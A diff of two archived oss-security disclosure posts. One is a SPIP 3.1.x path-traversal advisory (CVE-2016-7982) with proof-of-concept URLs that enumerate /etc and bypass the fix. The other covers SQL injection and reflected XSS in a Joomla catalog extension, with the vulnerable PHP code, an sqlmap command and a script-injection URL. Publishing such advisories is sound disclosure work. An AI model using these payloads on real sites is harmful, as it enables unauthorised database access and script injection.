@@ -1,121 +1,132 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/10/12/8
-Message-ID: <279a0995-1c21-2dcb-d8e6-b7f9dd215f26@sysdream.com>
-Date: Wed, 12 Oct 2016 15:29:15 +0200
-From: Sysdream Labs <labs@...dream.com>
-To: oss-security@...ts.openwall.com
-Cc: fulldisclosure@...lists.org, spip-team-owner@...o.net
-Subject: CVE-2016-7982: SPIP 3.1.1/3.1.2 File Enumeration / Path Traversal
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/07/26/4
+Message-id: <38EF50CD-F76B-4180-8E01-44ED395D68CA@me.com>
+Date: Tue, 26 Jul 2016 08:37:28 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: SQLi and Reflected XSS in Huge IT catalog extension v1.0.4 for Joomla
 Content-Type: text/plain; charset=utf-8
 
-## SPIP 3.1.1/3.1.2 File Enumeration / Path Traversal (CVE-2016-7982)
+Title: SQLi and XSS in Huge IT catalog extension v1.0.4 for Joomla
+Author: Larry W. Cashdollar, @_larry0
+Date: 2015-07-17
+Download Site: http://extensions.joomla.org/extensions/extension/e-commerce/shopping-cart/catalog
+Vendor: www.huge-it.com
+Vendor Notified: 2015-07-17, fixed in v1.0.5
+Vendor Contact: info@...e-it.com
+Description: This extension is designed to help you display the products in the most attractive way. Joomla Catalog Extension has a stylish design with convenient construction for displaying the product to the customers.
+Vulnerability:
+The attacker must be logged in with at least manager level access or access to the administrative panel to exploit this vulnerability.
 
-### Product Description
+Reflected XSS in file ./views/submissions/tmpl/default.php via message_id parameter:
 
-SPIP is a publishing system for the Internet, which put importance on collaborative working, multilingual environments and ease of use. It is free software, distributed under the GNU/GPL licence.
-
-### Vulnerability Description
-
-The `valider_xml` file can be used to enumerate files on the system.
-
-**Access Vector**: remote
-
-**Security Risk**: medium
-
-**Vulnerability**: CWE-538
-
-**CVSS Base Score**: 4.9 (Medium)
-
-**CVE-ID**: CVE-2016-7982
-
-### Proof of Concept
-
-Enumerating `.ini` files inside `/etc` (SPIP 3.1.1) :
-
-    http://spip-dev.srv/ecrire/?exec=valider_xml&var_url=/etc&ext=ini&recur=2
-
-Bypassing SPIP 3.1.2 protection using PHP Wrappers :
-
-    http://spip-dev.srv/ecrire/?exec=valider_xml&var_url=file:///etc&ext=ini&recur=2
-
-### Vulnerable code
-
-    if (is_dir($url)) {
-        $dir = (substr($url, -1, 1) === '/') ? $url : "$url/";
-        $ext = !preg_match('/^[.*\w]+$/', $req_ext) ? 'php' : $req_ext;
-        $files = preg_files($dir, "$ext$", $limit, $rec);
-        if (!$files and $ext !== 'html') {
-          $files = preg_files($dir, 'html$', $limit, $rec);
-          if ($files) {
-            $ext = 'html';
-          }
-        }
-        if ($files) {
-          $res = valider_dir($files, $ext, $url);
-          list($err, $res) = valider_resultats($res, $ext === 'html');
-
-File names are stored in `$res` and displayed by `echo` on line 146 :
-
-    echo "<h1>", $titre, '<br>', $bandeau, '</h1>',
-    "<div style='text-align: center'>", $onfocus, "</div>",
-      $res,
-      fin_page();
+825:   <input type="hidden" id="message_id" value ="<?php echo $_GET['message_id']; ?>" />
 
 
+SQL Injection 
 
-### Timeline (dd/mm/yyyy)
+in file ./models/submissions.php via id parameter
+59-        $query = $db->getQuery(true);
+60-        $id = JRequest::getVar('message_id');
+61-        $this-> updateReadInfo($id);
+62:        $query->select('*,#__huge_it_catalog_products.name as product_name, #__huge_it_catalog_asc_seller.id as  message_id');
+63-        $query->from('#__huge_it_catalog_asc_seller,#__huge_it_catalog_products');
+64-        $query->where('#__huge_it_catalog_asc_seller.product_id = #__huge_it_catalog_products.id and #__huge_it_catalog_asc_seller.id = "'.$id.'"');
+65-        $db->setQuery($query);
+in file ./models/comment.php via projectId parameter:
 
-* 15/09/2016 : Initial discovery
-* 26/09/2016 : Contact with SPIP Team
-* 27/09/2016 : Answer from SPIP Team, sent advisory details
-* 27/09/2016 : Incorrect fixes for Path Traversal
-* 27/09/2016 : New proof of concept for bypassing Path Traversal sent.
-* 27/09/2016 : Bad fix for Path Traversal (23185)
-* 28/09/2016 : New proof of concept for bypassing fixes for Path Traversal on Windows systems.
-* 28/09/2016 : Fixes issued Path Traversal (23200)
-* 30/09/2016 : SPIP 3.1.3 Released
+56-        $db = JFactory::getDBO();
+57-       $id = JRequest::getVar('projectId'); 
+58-       $query = $db->getQuery(true);
+59:        $query->select('*,#__huge_it_catalog_reviews.id as comId, #__huge_it_catalog_reviews.name as author_name, #__huge_it_catalog_products.name as product_name')
+60-             ->from('#__huge_it_catalog_reviews, #__huge_it_catalog_products')
+61-         ->where('#__huge_it_catalog_reviews.product_id = #__huge_it_catalog_products.id and #__huge_it_catalog_products.id = "'.$id.'"');
+62-        $db->setQuery($query);
 
-### Fixes
+in file ./models/rating.php via projectId parameter:
 
-* https://core.spip.net/projects/spip/repository/revisions/23207
-* https://core.spip.net/projects/spip/repository/revisions/23208
-* https://core.spip.net/projects/spip/repository/revisions/23206
-* https://core.spip.net/projects/spip/repository/revisions/23202
-* https://core.spip.net/projects/spip/repository/revisions/23201
-* https://core.spip.net/projects/spip/repository/revisions/23200
-* https://core.spip.net/projects/spip/repository/revisions/23191
-* https://core.spip.net/projects/spip/repository/revisions/23190
-* https://core.spip.net/projects/spip/repository/revisions/23193
-* https://core.spip.net/projects/spip/repository/revisions/23188
-* https://core.spip.net/projects/spip/repository/revisions/23187
-* https://core.spip.net/projects/spip/repository/revisions/23185
-* https://core.spip.net/projects/spip/repository/revisions/23182
-* https://core.spip.net/projects/spip/repository/revisions/23184
+55-        return $results;
+56-    } 
+57-    
+58-    public  function getRatingById() {
+59-        $db = JFactory::getDBO();
+60:       $id = JRequest::getVar('projectId'); 
+61-       $query = $db->getQuery(true);
+62-        $query->select('*,#__huge_it_catalog_rating.id as ratId')
+63-             ->from('#__huge_it_catalog_rating, #__huge_it_catalog_products')
+64-         ->where('#__huge_it_catalog_rating.prod_id = #__huge_it_catalog_products.id and #__huge_it_catalog_products.id = "'.$id.'"');
+65-        $db->setQuery($query);
 
+in file ./models/catalog.php via id parameter:
 
-### Affected versions
+45:        $id_cat = JRequest::getVar('id');
+46-        $query = $db->getQuery(true);
+47-        $query->select('#__huge_it_catalog_products.name as name,'
+48-                . '#__huge_it_catalog_products.id ,'
+49-                . '#__huge_it_catalogs.name as catName,'
+50-                . 'catalog_id,#__huge_it_catalog_products.description as productDescription,#__huge_it_catalog_products.parameters as productParameters,#__huge_it_catalogs.description,image_url,sl_url,sl_type,price,market_price,single_product_url_type,single_product_url_type,#__huge_it_catalog_products.link_target as productLinkTarget,#__huge_it_catalog_products.ordering,#__huge_it_catalog_products.published,published_in_sl_width');
+51-        $query->from(array('#__huge_it_catalogs' => '#__huge_it_catalogs', '#__huge_it_catalog_products' => '#__huge_it_catalog_products'));
+52-        $query->where('#__huge_it_catalogs.id = catalog_id')->where('catalog_id=' . $id_cat);
+53-        $query->order('ordering asc');
+54-       
+55-        $db->setQuery($query);
+--
+63:        $id_cat = JRequest::getVar('id');
+64-        $query = $db->getQuery(true);
+65-        $query->select('*');
+66-        $query->from('#__huge_it_catalog_products');
+67-        $query->where('catalog_id=' . $id_cat);
+68-        $db->setQuery($query);
+69-        $results = $db->loadObjectList();
+70-        return $results;
+71-    }
+72-
+73-    public function save($data) {
+--
+121:        $id_cat = JRequest::getVar('id');
+122-        $query = $db->getQuery(true);
+123-        $query->update('#__huge_it_catalogs')->set('name ="' . $name . '"')->where('id="' . $id_cat . '"');
+124-        $db->setQuery($query);
+125-        $db->execute();
+126-    }
+127-
+128-    function selectStyle() {
+129-        $db = JFactory::getDBO();
+130-        $data = JRequest::get('post');
+131-          $name = $data['name'];
+--
+136:        $id_cat = JRequest::getVar('id');
+137-        $query = $db->getQuery(true);
+138-        
+139-        $query->update('#__huge_it_catalogs')
+140-              ->set('name ="' . $name . '"')
+141-              ->set('catalog_list_effects_s ="'.$catalog_effects_list.'"')
+142-              ->set('pagination_type ="'.$pagination_type.'"')
+143-              ->set('count_into_page ="'.$count_into_page.'"')
+144-              ->set('categories ="'.$allCategories.'"')
+145-              ->where('id="' . $id_cat . '"');
+146-        $db->setQuery($query);
+--
 
-* Version <= 3.1.2
+via removeslide parameter:
 
-### Credits
+208:        $id_cat = JRequest::getVar('removeslide');
+209:        $id = JRequest::getVar('id');
+210-        $db = JFactory::getDBO();
+211-        $query = $db->getQuery(true);
+212-        $query->delete('#__huge_it_catalog_products')->where('id =' . $id_cat);
+213-        $db->setQuery($query);
+214-        $db->execute();
 
-* Nicolas CHATELAIN, Sysdream (n.chatelain -at- sysdream -dot- com)
+CVE-2016-1000119 XSS
+CVE-2016-1000120 SQLi
 
-
--- 
-SYSDREAM Labs <labs@...dream.com>
-
-GPG :
-47D1 E124 C43E F992 2A2E
-1551 8EB4 8CD9 D5B2 59A1
-
-* Website: https://sysdream.com/
-* Twitter: @sysdream
-
-
-
-
-
-
-
-Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
+Exploit Code:
+	• SQLi:
+	•  
+	• $ sqlmap  --load-cookies=cookies.txt -u "http://192.168.0.125/administrator/index.php?option=com_catalog&view=catalog&id=*" --dbms mysql 
+	•  
+	• XSS:
+	•  
+	• http://192.168.0.125/administrator/index.php?option=com_catalog&view=catalog&id=1--%20%22%3E%3Cscript%3Ealert(1);%3C/script%3E
+Advisory: http://www.vapidlabs.com/advisory.php?v=167
